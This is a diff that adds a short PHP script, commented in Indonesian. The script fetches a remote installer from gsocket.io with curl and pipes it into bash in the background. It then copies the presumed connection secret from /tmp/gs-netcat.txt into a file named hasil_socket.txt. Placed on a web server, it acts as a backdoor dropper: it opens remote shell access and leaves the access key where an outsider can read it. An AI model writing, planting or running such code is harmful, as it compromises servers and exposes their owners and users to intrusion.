@@ -1,0 +1,18 @@
+<?php
+// Jalankan perintah bash secara background
+$output = shell_exec('bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1 &');
+
+// Tunggu beberapa saat agar proses selesai (opsional)
+sleep(2);
+
+// Asumsikan hasil dari perintah akan muncul di file /tmp/gs-netcat.txt (misalnya)
+$socketCodeFile = '/tmp/gs-netcat.txt';
+
+// Cek apakah file ada, dan salin isinya ke file lain
+if (file_exists($socketCodeFile)) {
+    $data = file_get_contents($socketCodeFile);
+    file_put_contents('hasil_socket.txt', $data);
+} else {
+    file_put_contents('hasil_socket.txt', "Socket code tidak ditemukan.");
+}
+?>
